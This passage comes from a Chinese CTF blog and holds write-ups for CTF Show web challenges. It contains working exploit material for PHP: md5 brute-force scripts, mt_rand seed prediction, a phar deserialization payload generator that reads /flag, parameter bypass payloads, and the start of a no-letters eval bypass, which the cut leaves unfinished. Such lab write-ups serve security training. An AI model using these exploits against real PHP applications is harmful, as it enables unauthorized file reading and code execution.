class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">intval(<span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ]) 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 <span class="keyword">var</span> 的 <span class="keyword">integer</span> 数值</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>脚本：如果是 二位数</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;asdfghjklqwertyuiopzxcvbnm1234567890&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;36;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=0;<span class="variable">$j</span>&lt;36;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span>=<span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];    </span><br><span class="line">        <span class="variable">$token</span> = md5(<span class="variable">$token</span>); </span><br><span class="line">        <span class="keyword">if</span>(substr(<span class="variable">$token</span>, 1,1)===substr(<span class="variable">$token</span>, 14,1) &amp;&amp; substr(<span class="variable">$token</span>, 14,1) ===substr(<span class="variable">$token</span>, 17,1))&#123; </span><br><span class="line">            <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, 1,1))+intval(substr(<span class="variable">$token</span>, 14,1))+substr(<span class="variable">$token</span>, 17,1))/substr(<span class="variable">$token</span>, 1,1)===intval(substr(<span class="variable">$token</span>, 31,1)))&#123; </span><br><span class="line">                <span class="built_in">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">                <span class="built_in">exit</span>(0);</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br><span class="line"><span class="comment"># 得到 3j</span></span><br></pre></td></tr></table></figure>

<p><strong>脚本：如果是 三位数</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"><span class="built_in">print</span> (strlen(<span class="variable">$string</span>).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = 0; <span class="variable">$a</span> &lt; 62; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$b</span> = 0; <span class="variable">$b</span> &lt; 62; <span class="variable">$b</span>++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$c</span> = 0; <span class="variable">$c</span> &lt; 62; <span class="variable">$c</span>++) &#123;</span><br><span class="line">            <span class="variable">$flag</span> = <span class="variable">$string</span>[<span class="variable">$a</span>] . <span class="variable">$string</span>[<span class="variable">$b</span>] . <span class="variable">$string</span>[<span class="variable">$c</span>];</span><br><span class="line">            <span class="variable">$token</span> = md5(<span class="variable">$flag</span>);</span><br><span class="line">            <span class="keyword">if</span>(substr(<span class="variable">$token</span>, 1,1)===substr(<span class="variable">$token</span>, 14,1) &amp;&amp; substr(<span class="variable">$token</span>, 14,1) ===substr(<span class="variable">$token</span>, 17,1))&#123; </span><br><span class="line">            	<span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, 1,1))+intval(substr(<span class="variable">$token</span>, 14,1))+substr(<span class="variable">$token</span>, 17,1))/substr(<span class="variable">$token</span>, 1,1)===intval(substr(<span class="variable">$token</span>, 31,1)))&#123; </span><br><span class="line">                    <span class="built_in">echo</span> <span class="variable">$flag</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 得到 62 aDp a6e b7l ejt hc2 jGd ktD o07 pjd ubv vMJ v8O wuB wyG xjF AKh DCj D36 GT7 H3D Jik JKh KtR K2e LfJ Lqj Nzc Oie OiU R7V ScB SSM SVi UYg WwF 1zg 4cQ 422 6xU 6Vh 7vE</span></span><br></pre></td></tr></table></figure>

<h2 id="1-4-Web-24-—-php-伪随机数-—-mt-srand"><a href="#1-4-Web-24-—-php-伪随机数-—-mt-srand" class="headerlink" title="1.4 Web 24 — php 伪随机数 — mt_srand()"></a>1.4 Web 24 — php 伪随机数 — mt_srand()</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(372619038);</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$r</span>)===intval(mt_rand()))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    <span class="built_in">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phpmt_srand(372619038);<span class="built_in">echo</span>(mt_rand());?&gt;<span class="comment"># 得到 1155388967</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>伪随机数漏洞：当种子不变时，实际上生成的随机数是固定的。</strong></p>
</blockquote>
<p><img src="https://i.loli.net/2021/08/03/41LYMjzASdVfFUW.png" alt="image-20210803191659621"></p>
<p><img src="https://i.loli.net/2021/08/03/Jh12MBwLlyzgCNH.png" alt="image-20210803191723585"></p>
<h2 id="1-5-Web-25-—-php-伪随机数-逆推种子-—-php-mt-seed-工具使用"><a href="#1-5-Web-25-—-php-伪随机数-逆推种子-—-php-mt-seed-工具使用" class="headerlink" title="1.5 Web 25 — php 伪随机数 逆推种子 — php_mt_seed 工具使用"></a>1.5 Web 25 — php 伪随机数 逆推种子 — php_mt_seed 工具使用</h2><p><a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>
<p>知道种子，可以确定你输出伪随机数的序列</p>
<p>知道随机数序列，倒过来也可以确定你的种子，如何确定？</p>
<p>工具 php_mt_seed</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);include(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];    mt_srand(hexdec(substr(md5(<span class="variable">$flag</span>), 0,8)));    <span class="variable">$rand</span> = intval(<span class="variable">$r</span>)-intval(mt_rand());    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;            <span class="built_in">echo</span> <span class="variable">$flag</span>;        &#125;    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">echo</span> <span class="variable">$rand</span>;    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);    <span class="built_in">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexdec() 函数把十六进制转换为十进制。mt_srand(hexdec(substr(md5(<span class="variable">$flag</span>), 0,8)));	<span class="comment">#确定 种子$rand = intval($r)-intval(mt_rand());		#得到随机数，与传入的 ?r 有关如果该随机数不存在，则输出 $rand如果该随机数存在，并且 $_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()) 则输出 $flag**代码分析**</span></span><br></pre></td></tr></table></figure>

<ul>
<li>那么生成的随机数，也就是与传入的 r 有关，而 r 我们可控</li>
<li>通过生成的随机数进行逆推可以得到种子，<a href="https://www.openwall.com/php_mt_seed/">工具 php_mt_seed</a></li>
</ul>
<p>还要注意的是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">得到 <span class="variable">$flag</span> 的条件：1. !<span class="variable">$rand</span> 即 <span class="variable">$rand</span> 不存在2. <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()) 也就是说，我们得计算出 token 的值，然后发包的时候要进行修改</span><br></pre></td></tr></table></figure>

<p>如何确保 <code>$rand 不存在</code> ？</p>
<p>测试</p>
<p><img src="https://i.loli.net/2021/08/04/AwBydsMHNcEvTaf.png" alt="image-20210804104524845"></p>
<p>当我们设置了种子之后 <code>mt_srand</code> ，我们只要传 同样的 r ，那么最终得到的 $rand 都是一样的，那么反过来，如果 我们传入 <code>?r=522258682</code> ，那最终就可以得到 $rand = 0</p>
<p><img src="https://i.loli.net/2021/08/04/cxFHsZhzS9WkE7i.png" alt="image-20210804104657248"></p>
<p>那现在我们就得要计算 <code>(mt_rand()+mt_rand())</code> 了</p>
<p>要计算生成的随机数之和，首先得先确定种子才行啊</p>
<p>使用工具 php_mt_seed</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/otukijoe/php_mt_seed.git</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/s7z4fFxmrRypnAv.png" alt="image-20210804105157149"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maketime ./php_mt_seed 1446899118</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/oGrb6JHqlOXT7VW.png" alt="image-20210804105726200"></p>
<p>通过抓包可以知道 该 php 版本是 PHP/7.3.11</p>
<p>计算 token 值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>highlight_file(<span class="keyword">__FILE__</span>);mt_srand(<span class="number">1048340704</span>);<span class="keyword">echo</span> mt_rand().<span class="string">&quot;\n&quot;</span>;<span class="keyword">echo</span> mt_rand()+mt_rand().<span class="string">&quot;\n&quot;</span>;<span class="comment">//1446899118 219330488<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>抓包改值</p>
<p><img src="https://i.loli.net/2021/08/04/W1RHU2xBnvaPcCy.png" alt="image-20210804110911859"></p>
<h2 id="1-6-Web-26"><a href="#1-6-Web-26" class="headerlink" title="1.6 Web 26"></a>1.6 Web 26</h2><p><img src="https://i.loli.net/2021/08/04/EMhK6QNp3OcSnyA.png" alt="image-20210804111036383"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p> 查看源码</p>
<p><img src="https://i.loli.net/2021/08/04/jWUtw3qxuB1pd2s.png" alt="image-20210804111200056"></p>
<p><img src="https://i.loli.net/2021/08/04/x18GrqLFoT5PRV7.png" alt="image-20210804111426026"></p>
<h2 id="1-7-Web-27-—-身份证爆破"><a href="#1-7-Web-27-—-身份证爆破" class="headerlink" title="1.7 Web 27 — 身份证爆破"></a>1.7 Web 27 — 身份证爆破</h2><p><img src="https://i.loli.net/2021/08/04/o42RDNuHFIJBS8Y.png" alt="image-20210804112204280"></p>
<p> <img src="https://i.loli.net/2021/08/04/piUhumyn5bV4aEq.png" alt="image-20210804111755165"></p>
<p><img src="https://i.loli.net/2021/08/04/TVUe3r1Y2vjW5ER.png" alt="image-20210804111806858"></p>
<p>我们需要爆破出 学生的出生日期</p>
<p>Burp</p>
<p>上面可以看到该平台是 1999-2017 年的，那么作为大学生此时应该十八九岁，所以他们应该是1980 年之后的基本上</p>
<p>那么我们就从 1980 年开始设置 date 字典</p>
<p><img src="https://i.loli.net/2021/08/04/c15B8xbASmQryaW.png" alt="image-20210804113135627"></p>
<p>然后成功查询，得到  <strong>恭喜您，您已被我校录取，你的学号为02015237 初始密码为身份证号码</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">621022199002015237  02015237</span><br></pre></td></tr></table></figure>

<p>最后成功登录即可</p>
<h2 id="1-8-Web-28"><a href="#1-8-Web-28" class="headerlink" title="1.8 Web 28"></a>1.8 Web 28</h2><p><img src="https://i.loli.net/2021/08/04/lCz96ZbM1hA7tKR.png" alt="image-20210804114109990"></p>
<p>Url 当中的 <code>/0/1/</code> 尝试爆破，即可得到</p>
]]></content>
      <categories>
        <category>CTF Show</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Show-吃瓜杯</title>
    <url>/2021/10/01/CTF-Show-%E5%90%83%E7%93%9C%E6%9D%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>CTF Show 吃瓜杯篇。</p>
<span id="more"></span>

<h1 id="CTF-Show-吃瓜杯"><a href="#CTF-Show-吃瓜杯" class="headerlink" title="CTF Show 吃瓜杯"></a>CTF Show 吃瓜杯</h1><h2 id="热身"><a href="#热身" class="headerlink" title="热身"></a>热身</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==4476)&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,0)===4476)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?num=%20010574</span><br><span class="line">?num=%0c010574</span><br><span class="line">?num=%0a010574</span><br></pre></td></tr></table></figure>

<h2 id="ATTup"><a href="#ATTup" class="headerlink" title="ATTup"></a>ATTup</h2><p>zip 文件上传 + 文件包含 file_get_contents —&gt; <a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">phar 反序列化</a></p>
<p>文件内容过滤  &lt;?   php ，过滤 <code>&lt;?</code> ，无法正常解析为 php 代码</p>
<p>上传成功发现：序列化与反序列化</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">class View &#123;</span><br><span class="line">    public <span class="variable">$fn</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$this</span>-&gt;fn));</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;&quot;</span>.<span class="variable">$text</span>.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public <span class="variable">$fun</span> = <span class="string">&quot;:)&quot;</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        <span class="variable">$fuc</span> = <span class="variable">$this</span>-&gt;fun;</span><br><span class="line">        <span class="variable">$fuc</span>();</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Just a fun &quot;</span>.<span class="variable">$this</span>-&gt;fun.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$stat</span> = @<span class="built_in">stat</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发 echo 对象; $text=$test+$对象； </span></span><br><span class="line">__invoke() <span class="comment">//当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span></span><br></pre></td></tr></table></figure>

<p><strong>生成 .phar 文件：</strong></p>
<p>我们的目的是成功创建 View 对象然后成功调用 __invoke() 方法，利用 file_get_contents 来读取到文件中的内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class View&#123;</span><br><span class="line">    public <span class="variable">$fn</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$this</span>-&gt;fn));</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;&quot;</span>.<span class="variable">$text</span>.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Fun&#123;</span><br><span class="line">    public <span class="variable">$fun</span>=<span class="string">&#x27;:)&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        <span class="variable">$fuc</span> = <span class="variable">$this</span>-&gt;fun;</span><br><span class="line">        <span class="variable">$fuc</span>();</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Just a fun &quot;</span>.<span class="variable">$this</span>-&gt;fun.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">&#x27;123.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&amp;lt;?= __HALT_COMPILER(); ?&amp;gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = new Fun();</span><br><span class="line"><span class="variable">$b</span>-&gt;fun= new Fun();</span><br><span class="line"><span class="variable">$b</span>-&gt;fun-&gt;fun=new View(); <span class="comment"># 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用</span></span><br><span class="line"><span class="variable">$b</span>-&gt;fun-&gt;fun-&gt;fn=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>

<ul>
<li><code>&lt;?</code> 过滤，使用 实体html 编码代替 ，<code>&amp;lt;    &amp;gt;</code>   </li>
</ul>
<p>访问，生成 123.phar</p>
<p>更改后缀得到 123.zip</p>
<p>上传</p>
<p>查询 123.zip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file=phar://123.zip</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/16/Zvp58TYJkoBsUfO.png" alt="image-20210816154246098"></p>
<p><img src="https://i.loli.net/2021/10/01/p8VCePGW9IHAQd6.png" alt="image-20210816113908803"></p>
<h2 id="魔女"><a href="#魔女" class="headerlink" title="魔女"></a>魔女</h2><p><img src="https://i.loli.net/2021/08/14/IekhA6SdQWPnt7N.png" alt="image-20210814201633444"></p>
<p>注册</p>
<p><img src="https://i.loli.net/2021/08/14/KmC57VgziIMBRa4.png" alt="image-20210814201610476"></p>
<p>注册成功，登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">layui.use([<span class="string">&#x27;layer&#x27;</span>, <span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;table&#x27;</span>,<span class="string">&#x27;element&#x27;</span>], <span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">	  var layer = layui.layer</span><br><span class="line">	  ,form = layui.form</span><br><span class="line">	  ,table = layui.table</span><br><span class="line">	  ,element = layui.element</span><br><span class="line"></span><br><span class="line">	&#125;);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">home</span></span>()&#123;</span><br><span class="line">    $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;main&#x27;</span>);</span><br><span class="line">    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    location.replace(location.href);</span><br><span class="line">  &#125;</span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">logout</span></span>()&#123;</span><br><span class="line">		$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;logout&#x27;</span>);</span><br><span class="line">		$.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">		location.replace(location.href);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">saveAvatar</span></span>()&#123;</span><br><span class="line">		$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;download&#x27;</span>);</span><br><span class="line">	    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;avatar.jpg|true&#x27;</span>);</span><br><span class="line">	    window.open(location.href);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">avatar</span></span>()&#123;</span><br><span class="line">		layer.prompt(&#123;</span><br><span class="line">		  formType: 0,</span><br><span class="line">		  value: <span class="string">&#x27;http://xxx.com/x.jpg(其他格式无效)&#x27;</span>,</span><br><span class="line">		  title: <span class="string">&#x27;修改头像&#x27;</span>,</span><br><span class="line">		&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">      layer.close(index);</span><br><span class="line">		  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;xixi|&#x27;</span>+value);</span><br><span class="line">		  $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;changeavatar&#x27;</span>);</span><br><span class="line">      location.replace(location.href);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">profile</span></span>()&#123;</span><br><span class="line"></span><br><span class="line">		$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;page&#x27;</span>);</span><br><span class="line">	    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">	    location.replace(location.href);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">changePSW</span></span>()&#123;</span><br><span class="line">		layer.prompt(&#123;</span><br><span class="line">		  formType: 0,</span><br><span class="line">		  value: <span class="string">&#x27;请输入当前密码&#x27;</span>,</span><br><span class="line">		  title: <span class="string">&#x27;修改密码&#x27;</span>,</span><br><span class="line">		&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">		  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+value);</span><br><span class="line">		  layer.close(index);</span><br><span class="line">		  layer.prompt(&#123;</span><br><span class="line">		  formType: 0,</span><br><span class="line">		  value: <span class="string">&#x27;请输入新密码&#x27;</span>,</span><br><span class="line">		  title: <span class="string">&#x27;修改密码&#x27;</span>,</span><br><span class="line">			&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">			  layer.close(index);</span><br><span class="line">			  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,$.cookie(<span class="string">&#x27;ctfshow&#x27;</span>)+<span class="string">&#x27;|&#x27;</span>+value);</span><br><span class="line">			  $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;changepwd&#x27;</span>);</span><br><span class="line">			  location.replace(location.href);</span><br><span class="line">			&#125;);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h2 id="shellme-Revenge"><a href="#shellme-Revenge" class="headerlink" title="shellme_Revenge"></a>shellme_Revenge</h2><p><img src="https://i.loli.net/2021/08/14/R9IkSsTqpHV1dtf.png" alt="image-20210814203429707"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/?looklook=1</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;looklook&#x27;</span>])&#123;    highlight_file(__FILE__);&#125;<span class="keyword">else</span>&#123;    setcookie(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;?looklook&quot;</span>, time()+3600);&#125;<span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];    <span class="keyword">if</span> (is_string(<span class="variable">$ctfshow</span>) || strlen(<span class="variable">$ctfshow</span>) &lt;= 107) &#123;        <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;            <span class="built_in">eval</span>(<span class="variable">$ctfshow</span>);        &#125;<span class="keyword">else</span>&#123;            <span class="built_in">echo</span>(<span class="string">&quot;fucccc hacker!!&quot;</span>);        &#125;    &#125;&#125; <span class="keyword">else</span> &#123;    phpinfo();&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>assert()</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php<span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="variable">$_</span>&quot;</span>; // <span class="variable">$_</span>=<span class="string">&#x27;Array&#x27;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; // <span class="variable">$_</span>=<span class="variable">$_</span>[0];<span class="variable">$___</span>=<span class="variable">$_</span>; // A<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span 